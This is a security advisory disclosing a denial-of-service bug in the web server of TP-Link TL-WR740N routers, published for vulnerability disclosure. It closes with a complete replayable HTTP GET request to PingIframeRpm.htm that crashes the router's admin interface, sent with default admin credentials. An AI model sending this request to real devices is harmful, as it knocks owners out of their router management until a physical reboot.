TP-Link TL-WR740N Wireless Router MitM httpd Denial Of Service


Vendor: TP-LINK Technologies Co., Ltd.
Product web page: http://www.tp-link.us

Affected version:

- Firmware version: 3.17.0 Build 140520 Rel.75075n (Released: 5/20/2014)
- Firmware version: 3.16.6 Build 130529 Rel.47286n (Released: 5/29/2013)
- Firmware version: 3.16.4 Build 130205 Rel.63875n (Released: 2/5/2013)
- Hardware version: WR740N v4 00000000 (v4.23)
- Model No. TL-WR740N / TL-WR740ND

Summary: The TL-WR740N is a combined wired/wireless network connection
device integrated with internet-sharing router and 4-port switch. The
wireless N Router is 802.11b&g compatible based on 802.11n technology
and gives you 802.11n performance up to 150Mbps at an even more affordable
price. Bordering on 11n and surpassing 11g speed enables high bandwidth
consuming applications like video streaming to be more fluid.

Desc: The TP-Link WR740N Wireless N Router network device is exposed to a
denial of service vulnerability when processing a HTTP GET request. This
issue occurs when the web server (httpd) fails to handle a HTTP GET request
over a given default TCP port 80. Resending the value 'new' to the 'isNew'
parameter in 'PingIframeRpm.htm' script to the router thru a proxy will
crash its httpd service denying the legitimate users access to the admin
control panel management interface. To bring back the http srv and the
admin UI, a user must physically reboot the router.

Tested on: Router Webserver


Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
                            @zeroscience


Advisory ID: ZSL-2014-5210
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5210.php


13.11.2014

---


Replay

GET /userRpm/PingIframeRpm.htm?ping_addr=zeroscience.mk&doType=ping&isNew=new&lineNum=1 HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.1/userRpm/PingIframeRpm.htm?ping_addr=zeroscience.mk&doType=ping&isNew=new&sendNum=4&pSize=64&overTime=800&trHops=20
Authorization: Basic YWRtaW46YWRtaW4=
Connection: keep-alive